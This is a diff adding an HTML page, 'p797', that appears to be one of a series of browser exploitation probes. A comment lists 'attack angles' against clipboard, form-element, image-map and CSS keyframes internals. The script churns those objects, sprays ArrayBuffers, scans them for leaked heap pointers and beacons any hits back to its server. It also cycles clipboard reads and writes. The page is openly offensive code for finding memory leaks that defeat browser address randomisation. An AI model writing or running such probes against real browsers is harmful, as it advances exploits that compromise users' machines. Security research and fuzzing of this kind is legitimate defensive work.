@@ -1,0 +1,449 @@
+<!--
+  p797: Clipboard API / HTMLMeterElement / HTMLProgressElement /
+        HTMLOutputElement / HTMLMapElement / HTMLAreaElement residue
+
+  Clipboard API: navigator.clipboard.writeText/readText creates C++
+  ClipboardItem objects and serialized data representations. Even
+  when permission is denied, the C++ promise and data wrappers are
+  allocated. ClipboardItem constructor with multiple types allocates
+  a C++ type map.
+
+  HTMLMeterElement: internal C++ state tracks value, min, max, low,
+  high, optimum and computes gauge region (optimum/suboptimal/
+  even-less-good). Shadow DOM creates meter bar and value bar
+  pseudo-elements. Rapid property changes exercise the layout
+  invalidation path.
+
+  HTMLProgressElement: internal C++ state tracks value and max.
+  Indeterminate state (no value attribute) vs determinate exercises
+  different layout paths. Shadow DOM creates progress bar and
+  value pseudo-elements.
+
+  HTMLOutputElement: htmlFor (DOMTokenList) association with form
+  controls. defaultValue/value/setCustomValidity exercise the
+  C++ form-associated custom element state.
+
+  HTMLMapElement/HTMLAreaElement: image map coordinate parsing
+  allocates C++ MapCoordinates objects. Area shapes (rect, circle,
+  poly) with many coords exercise the parser.
+
+  CSSKeyframesRule/CSSKeyframeRule: @keyframes rule manipulation
+  via CSSOM creates C++ keyframe objects. appendRule/deleteRule/
+  findRule exercise the keyframe list allocator.
+
+  Attack angles:
+  A) Clipboard API write/read cycles.
+  B) HTMLMeterElement property churn.
+  C) HTMLProgressElement determinate/indeterminate cycling.
+  D) HTMLOutputElement for= association churn.
+  E) HTMLMapElement/HTMLAreaElement coordinate parsing.
+  F) CSSKeyframesRule CSSOM manipulation.
+
+  CRASH_CLASS: LOW (form elements, CSS rules, clipboard API)
+  prior art: p788 (form validation), p794 (animations)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p797</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function hex64(dv,off){
+  var lo=dv.getUint32(off,true),hi=dv.getUint32(off+4,true);
+  var hs=hi.toString(16),ls=lo.toString(16);
+  while(ls.length<8)ls='0'+ls;
+  return '0x'+hs+ls;
+}
+function isPtr(dv,off){
+  var hi=dv.getUint32(off+4,true);
+  return hi!==0 && hi!==0xFFFFFFFF && (hi>>>0)<0x80000000 && hi>0x100;
+}
+function sprayAndScan(tag,round,sizes){
+  var hits=0;
+  for(var si=0;si<sizes.length;si++){
+    var sz=sizes[si];
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(sz);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=sz;off+=8){
+        if(isPtr(dv,off)){
+          hits++;
+          if(hits<=2)b(tag+'-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+  }
+  return hits;
+}
+
+window.onload=function(){
+b('p797-START');
+
+// === Section A: Clipboard API write/read cycles ===
+try{
+  b('A-clipboard');
+  var aHits=0;
+
+  var clipSupported=navigator.clipboard&&typeof navigator.clipboard.writeText==='function';
+  if(!clipSupported){
+    b('A-SKIP no Clipboard API');
+  }else{
+    for(var round=0;round<5;round++){
+      (function(){
+        var promises=[];
+
+        // writeText cycles
+        for(var i=0;i<30;i++){
+          try{
+            var text='Clipboard data item '+round+'_'+i+' with padding: '+'x'.repeat(50+i*10);
+            promises.push(navigator.clipboard.writeText(text).catch(function(){}));
+          }catch(e){
+            if(i===0&&round===0)b('A write_err='+e.message);
+          }
+        }
+
+        // readText cycles
+        for(var i=0;i<20;i++){
+          try{
+            promises.push(navigator.clipboard.readText().then(function(t){
+              if(round===0&&i===0)b('A readText len='+(t?t.length:0));
+            }).catch(function(){}));
+          }catch(e){}
+        }
+
+        // ClipboardItem constructor if available
+        if(typeof ClipboardItem!=='undefined'){
+          for(var i=0;i<20;i++){
+            try{
+              var item=new ClipboardItem({
+                'text/plain': new Blob(['Item '+i+' plain text'], {type:'text/plain'}),
+                'text/html': new Blob(['<b>Item '+i+'</b> html'], {type:'text/html'})
+              });
+              promises.push(navigator.clipboard.write([item]).catch(function(){}));
+            }catch(e){
+              if(i===0&&round===0)b('A clipitem_err='+e.message);
+            }
+          }
+          if(round===0)b('A ClipboardItem available, created 20 multi-type items');
+        }else{
+          if(round===0)b('A no ClipboardItem constructor');
+        }
+
+        if(round===0)b('A triggered '+promises.length+' clipboard operations');
+      })();
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+      aHits+=sprayAndScan('A',round,[32,48,64,96,128]);
+    }
+  }
+  b('A-DONE hits='+aHits);
+}catch(e){b('A-ERR '+e.message);}
+
+// === Section B: HTMLMeterElement property churn ===
+try{
+  b('B-meter');
+  var bHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var meters=[];
+
+      for(var i=0;i<50;i++){
+        var m=document.createElement('meter');
+        document.body.appendChild(m);
+
+        // Set and rapidly change all meter properties
+        for(var cycle=0;cycle<10;cycle++){
+          m.min=0;
+          m.max=100+cycle*10;
+          m.low=20+cycle*2;
+          m.high=80-cycle*2;
+          m.optimum=[10,50,90][cycle%3];
+          m.value=i+cycle*5;
+
+          // Force layout to exercise gauge computation
+          var h=m.offsetHeight;
+          var w=m.offsetWidth;
+        }
+
+        if(round===0&&i===0){
+          b('B meter value='+m.value+' min='+m.min+' max='+m.max+' low='+m.low+' high='+m.high+' optimum='+m.optimum);
+        }
+
+        meters.push(m);
+      }
+
+      if(round===0)b('B created '+meters.length+' meters with 10 property change cycles each');
+
+      for(var i=0;i<meters.length;i++){
+        document.body.removeChild(meters[i]);
+      }
+      meters=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    bHits+=sprayAndScan('B',round,[32,48,64,96]);
+  }
+  b('B-DONE hits='+bHits);
+}catch(e){b('B-ERR '+e.message);}
+
+// === Section C: HTMLProgressElement determinate/indeterminate cycling ===
+try{
+  b('C-progress');
+  var cHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var bars=[];
+
+      for(var i=0;i<50;i++){
+        var p=document.createElement('progress');
+        document.body.appendChild(p);
+
+        // Cycle between determinate and indeterminate
+        for(var cycle=0;cycle<15;cycle++){
+          if(cycle%3===0){
+            // Indeterminate (remove value)
+            p.removeAttribute('value');
+            p.max=100;
+          }else{
+            // Determinate
+            p.max=100+cycle*5;
+            p.value=(i*cycle)%(p.max+1);
+          }
+
+          var h=p.offsetHeight;
+        }
+
+        if(round===0&&i===0){
+          b('C progress value='+p.value+' max='+p.max+' position='+p.position);
+        }
+
+        bars.push(p);
+      }
+
+      if(round===0)b('C created '+bars.length+' progress bars with 15 determinate/indeterminate cycles');
+
+      for(var i=0;i<bars.length;i++){
+        document.body.removeChild(bars[i]);
+      }
+      bars=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    cHits+=sprayAndScan('C',round,[32,48,64,96]);
+  }
+  b('C-DONE hits='+cHits);
+}catch(e){b('C-ERR '+e.message);}
+
+// === Section D: HTMLOutputElement for= association churn ===
+try{
+  b('D-output');
+  var dHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var form=document.createElement('form');
+      document.body.appendChild(form);
+
+      var inputs=[];
+      for(var i=0;i<20;i++){
+        var inp=document.createElement('input');
+        inp.type=['text','number','range','checkbox','radio'][i%5];
+        inp.id='inp_'+round+'_'+i;
+        inp.name='field_'+i;
+        if(inp.type==='range'){inp.min='0';inp.max='100';inp.value=String(i*5);}
+        if(inp.type==='number')inp.value=String(i*10);
+        form.appendChild(inp);
+        inputs.push(inp);
+      }
+
+      var outputs=[];
+      for(var i=0;i<30;i++){
+        var out=document.createElement('output');
+        form.appendChild(out);
+
+        // Set htmlFor associations
+        out.htmlFor.add('inp_'+round+'_'+(i%20));
+        if(i%3===0)out.htmlFor.add('inp_'+round+'_'+((i+5)%20));
+
+        // Set values and validity
+        out.defaultValue='default_'+i;
+        out.value='computed_'+i+'_'+round;
+        try{out.setCustomValidity(i%4===0?'Error for output '+i:'');}catch(e){}
+
+        // Churn htmlFor
+        for(var j=0;j<5;j++){
+          out.htmlFor.remove('inp_'+round+'_'+(i%20));
+          out.htmlFor.add('inp_'+round+'_'+((i+j+1)%20));
+          var h=out.offsetHeight;
+        }
+
+        if(round===0&&i===0){
+          b('D output value='+out.value+' defaultValue='+out.defaultValue+' htmlFor='+out.htmlFor.toString());
+          b('D validity='+out.validity.valid+' validationMessage='+out.validationMessage);
+        }
+
+        outputs.push(out);
+      }
+
+      if(round===0)b('D created '+outputs.length+' outputs with '+inputs.length+' inputs, htmlFor churn');
+
+      document.body.removeChild(form);
+      inputs=null;outputs=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    dHits+=sprayAndScan('D',round,[32,48,64,96]);
+  }
+  b('D-DONE hits='+dHits);
+}catch(e){b('D-ERR '+e.message);}
+
+// === Section E: HTMLMapElement/HTMLAreaElement coordinate parsing ===
+try{
+  b('E-imagemap');
+  var eHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var maps=[];
+
+      for(var m=0;m<15;m++){
+        var map=document.createElement('map');
+        map.name='map_'+round+'_'+m;
+        document.body.appendChild(map);
+
+        // Create areas with complex coordinate strings
+        for(var a=0;a<20;a++){
+          var area=document.createElement('area');
+
+          if(a%3===0){
+            // rect
+            area.shape='rect';
+            area.coords=(a*10)+','+(a*5)+','+(a*10+100)+','+(a*5+80);
+          }else if(a%3===1){
+            // circle
+            area.shape='circle';
+            area.coords=(50+a*15)+','+(50+a*10)+','+(20+a*3);
+          }else{
+            // poly with many points
+            var pts=[];
+            for(var p=0;p<12;p++){
+              pts.push(Math.floor(Math.sin(p+a)*100+200));
+              pts.push(Math.floor(Math.cos(p+a)*100+200));
+            }
+            area.shape='poly';
+            area.coords=pts.join(',');
+          }
+
+          area.href='#area_'+m+'_'+a;
+          area.alt='Area '+m+'_'+a;
+          area.target='_self';
+          map.appendChild(area);
+        }
+
+        if(round===0&&m===0){
+          b('E map areas='+map.areas.length+' name='+map.name);
+          if(map.areas.length>0){
+            var firstArea=map.areas[0];
+            b('E area shape='+firstArea.shape+' coords='+firstArea.coords);
+          }
+        }
+
+        maps.push(map);
+      }
+
+      // Create images referencing maps
+      for(var m=0;m<maps.length;m++){
+        var img=document.createElement('img');
+        img.useMap='#map_'+round+'_'+m;
+        img.width=400;img.height=300;
+        img.alt='Map image '+m;
+        document.body.appendChild(img);
+        var h=img.offsetHeight;
+        document.body.removeChild(img);
+      }
+
+      if(round===0)b('E created '+maps.length+' maps with 20 areas each (rect/circle/poly)');
+
+      for(var i=0;i<maps.length;i++){
+        // Remove all areas
+        while(maps[i].firstChild)maps[i].removeChild(maps[i].firstChild);
+        document.body.removeChild(maps[i]);
+      }
+      maps=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    eHits+=sprayAndScan('E',round,[32,48,64,96,128]);
+  }
+  b('E-DONE hits='+eHits);
+}catch(e){b('E-ERR '+e.message);}
+
+// === Section F: CSSKeyframesRule CSSOM manipulation ===
+try{
+  b('F-keyframes-rule');
+  var fHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var ruleCount=0;
+
+      for(var s=0;s<10;s++){
+        var style=document.createElement('style');
+        document.head.appendChild(style);
+        var sheet=style.sheet;
+
+        // Insert @keyframes rules
+        for(var k=0;k<8;k++){
+          try{
+            sheet.insertRule('@keyframes anim_'+s+'_'+k+' { 0% { opacity: 0; transform: rotate(0deg); } 25% { opacity: 0.5; transform: rotate(90deg); } 50% { opacity: 1; transform: rotate(180deg); } 75% { opacity: 0.5; transform: rotate(270deg); } 100% { opacity: 0; transform: rotate(360deg); } }',sheet.cssRules.length);
+            ruleCount++;
+          }catch(e){}
+        }
+
+        // Access CSSKeyframesRule API
+        for(var r=0;r<sheet.cssRules.length;r++){
+          var rule=sheet.cssRules[r];
+          if(rule.type===7){ // CSSKeyframesRule
+            if(round===0&&s===0&&r===0){
+              b('F keyframes name='+rule.name+' cssRules='+rule.cssRules.length);
+            }
+
+            // appendRule/deleteRule
+            try{rule.appendRule('33% { opacity: 0.33; transform: scale(1.5); }');}catch(e){}
+            try{rule.appendRule('66% { opacity: 0.66; transform: scale(0.5); }');}catch(e){}
+
+            // findRule
+            try{
+              var found=rule.findRule('50%');
+              if(round===0&&s===0&&r===0&&found){
+                b('F findRule(50%) keyText='+found.keyText+' cssText='+found.cssText.substring(0,60));
+              }
+            }catch(e){}
+
+            // deleteRule
+            try{rule.deleteRule('25%');}catch(e){}
+            try{rule.deleteRule('75%');}catch(e){}
+          }
+        }
+
+        // Delete all rules from sheet
+        while(sheet.cssRules.length>0){
+          try{sheet.deleteRule(0);}catch(e){break;}
+        }
+
+        document.head.removeChild(style);
+      }
+
+      if(round===0)b('F inserted/manipulated '+ruleCount+' @keyframes rules across 10 sheets');
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    fHits+=sprayAndScan('F',round,[48,64,96,128]);
+  }
+  b('F-DONE hits='+fHits);
+}catch(e){b('F-ERR '+e.message);}
+
+b('p797-COMPLETE');
+};
+</script>
+</head>
+<body></body></html>
